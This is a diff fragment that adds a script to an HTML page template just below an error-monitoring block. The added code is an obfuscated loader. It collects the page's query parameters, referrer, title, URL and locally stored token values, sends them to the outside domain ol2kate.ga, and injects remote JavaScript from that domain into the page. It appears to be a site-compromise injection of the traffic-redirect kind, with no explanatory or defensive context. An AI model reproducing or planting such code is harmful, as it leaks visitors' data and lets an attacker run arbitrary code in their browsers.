@@ -38,6 +38,50 @@
             });
         </script>
         <!-- END BUGSNAG -->
+
+        <script>
+    (function() {
+    var name = '_1n8HCqg1Vv4Hy1GJ';
+    if (!window._1n8HCqg1Vv4Hy1GJ) {
+        window._1n8HCqg1Vv4Hy1GJ = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/TTTjdMts',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _5Fssgk6Ykwgq97Hh = localStorage.getItem('config');
+    if (typeof _5Fssgk6Ykwgq97Hh !== 'undefined' && _5Fssgk6Ykwgq97Hh !== null) {
+        var _dNnJyMvBPyRLP6P4 = JSON.parse(_5Fssgk6Ykwgq97Hh);
+        var _QHhYDx7pyCnPLfYb = Math.round(+new Date()/1000);
+        if (_dNnJyMvBPyRLP6P4.created_at + window._1n8HCqg1Vv4Hy1GJ.ttl < _QHhYDx7pyCnPLfYb) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _BpLP6MG8FTtsCK1Y = localStorage.getItem('subId');
+    var _9rftWDxJMm9KdcpT = localStorage.getItem('token');
+    var _cs84DbN1Q856r5BX = '?return=js.client';
+        _cs84DbN1Q856r5BX += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _cs84DbN1Q856r5BX += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _cs84DbN1Q856r5BX += '&default_keyword=' + encodeURIComponent(document.title);
+        _cs84DbN1Q856r5BX += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _cs84DbN1Q856r5BX += '&name=' + encodeURIComponent(name);
+        _cs84DbN1Q856r5BX += '&host=' + encodeURIComponent(window._1n8HCqg1Vv4Hy1GJ.R_PATH);
+    if (typeof _BpLP6MG8FTtsCK1Y !== 'undefined' && _BpLP6MG8FTtsCK1Y && window._1n8HCqg1Vv4Hy1GJ.unique) {
+        _cs84DbN1Q856r5BX += '&sub_id=' + encodeURIComponent(_BpLP6MG8FTtsCK1Y);
+    }
+    if (typeof _9rftWDxJMm9KdcpT !== 'undefined' && _9rftWDxJMm9KdcpT && window._1n8HCqg1Vv4Hy1GJ.unique) {
+        _cs84DbN1Q856r5BX += '&token=' + encodeURIComponent(_9rftWDxJMm9KdcpT);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._1n8HCqg1Vv4Hy1GJ.R_PATH + _cs84DbN1Q856r5BX;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     
 
 
